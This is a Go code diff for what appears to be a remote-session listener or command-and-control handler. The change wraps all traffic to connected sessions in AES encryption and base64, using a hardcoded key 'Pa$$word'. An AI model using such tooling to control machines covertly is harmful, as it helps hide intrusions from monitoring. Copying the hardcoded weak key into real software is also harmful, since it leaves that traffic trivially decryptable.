@@ -12,6 +12,7 @@ import (
 	mrand "math/rand"
 	"time"
 	"encoding/hex"
+	"encoding/base64"
 	"crypto/md5"
 	"crypto/aes"
 	"crypto/cipher"
@@ -26,7 +27,7 @@ var SessConn []net.Conn
 var SessIPV4 []string
 var SessCount = 0 
 var CurrSess = -1
-
+var inPass = "Pa$$word"
 func main() {
 
 	go ListenForRequest()
@@ -71,7 +72,9 @@ func main() {
 
 			// Test to see of the Session Array works...
 			if CurrSess > -1 {
-				if _, serr := SessConn[CurrSess].Write([]byte(clientRequest)); serr != nil {
+				EncrOut := encrypt([]byte(clientRequest), inPass)
+				B64Out := fmt.Sprintf("%s\n", base64.StdEncoding.EncodeToString(EncrOut))
+				if _, serr := SessConn[CurrSess].Write([]byte(B64Out)); serr != nil {
 					log.Printf("Could Not Connect to Session: %d - %v\n", CurrSess, serr)
 				}
 			} else {
@@ -136,7 +139,10 @@ func handleClientRequest(con net.Conn) {
     	mrand.Seed(int64(time.Now().Nanosecond()))
 
 	Srv_Auth := fmt.Sprintf("Auth:%s\n", authRand)
-	if _, auth_err := con.Write([]byte(Srv_Auth)); auth_err != nil {
+	EncrOut := encrypt([]byte(Srv_Auth), inPass)
+	B64Out := fmt.Sprintf("%s\n", base64.StdEncoding.EncodeToString(EncrOut))
+
+	if _, auth_err := con.Write([]byte(B64Out)); auth_err != nil {
 		log.Printf("[!] Failed to Initiate Authorization: %v\n", auth_err)
 	}
 
@@ -158,7 +164,10 @@ func handleClientRequest(con net.Conn) {
 				log.Printf("[+] Invalid AuthVrfy String: %s\n", strings.TrimSpace(clientRequest[5:]))
 				SessStat[MyCount] = "Closed"
 
-				if _, auth_err := con.Write([]byte("BYE:\n")); auth_err != nil {
+				EncrOut := encrypt([]byte("BYE:\n"), inPass)
+				B64Out := fmt.Sprintf("%s\n", base64.StdEncoding.EncodeToString(EncrOut))
+
+				if _, auth_err := con.Write([]byte(B64Out)); auth_err != nil {
 					log.Printf("[!] Failed to Terminate Remote Session: %v\n", auth_err)
 				}
 				return
